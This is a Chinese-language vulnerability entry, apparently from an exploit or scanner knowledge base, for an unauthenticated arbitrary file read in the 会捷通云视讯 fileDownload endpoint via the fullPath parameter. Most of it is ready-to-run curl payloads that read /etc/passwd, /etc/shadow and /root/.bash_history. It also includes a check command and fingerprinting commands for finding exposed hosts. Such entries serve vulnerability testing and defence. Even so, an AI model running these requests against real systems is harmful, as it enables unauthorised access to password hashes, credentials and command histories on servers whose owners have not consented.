---
id: HUIJIETONG-FILE-READ
title: 会捷通云视讯 fileDownload 任意文件读取漏洞
product: huijietong
vendor: 会捷通
version_affected: "会捷通云视讯"
severity: HIGH
tags: [file_read, 无需认证, 国产]
fingerprint: ["会捷通", "/him/api/rest/", "云视讯"]
---

## 漏洞描述

会捷通云视讯平台的 `fileDownload` 接口存在任意文件读取漏洞。`fullPath` 参数未对路径进行限制，攻击者可读取服务器上任意文件。

## 影响版本

- 会捷通云视讯

## 前置条件

- 无需认证

## 利用步骤

1. 向 `/fileDownload?action=downloadBackupFile` 发送 POST 请求
2. 在 `fullPath` 参数中指定要读取的文件路径

## Payload

### 读取 /etc/passwd

```bash
curl -s "http://target/fileDownload?action=downloadBackupFile" \
  -d "fullPath=/etc/passwd"
```

### 读取其他敏感文件

```bash
curl -s "http://target/fileDownload?action=downloadBackupFile" \
  -d "fullPath=/etc/shadow"

curl -s "http://target/fileDownload?action=downloadBackupFile" \
  -d "fullPath=/root/.bash_history"
```

## 验证方法

```bash
curl -s "http://target/fileDownload?action=downloadBackupFile" \
  -d "fullPath=/etc/passwd" | grep "root:"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "会捷通\|云视讯"
curl -s "http://target/him/api/rest/v1.0/node/role" -o /dev/null -w "%{http_code}"
```
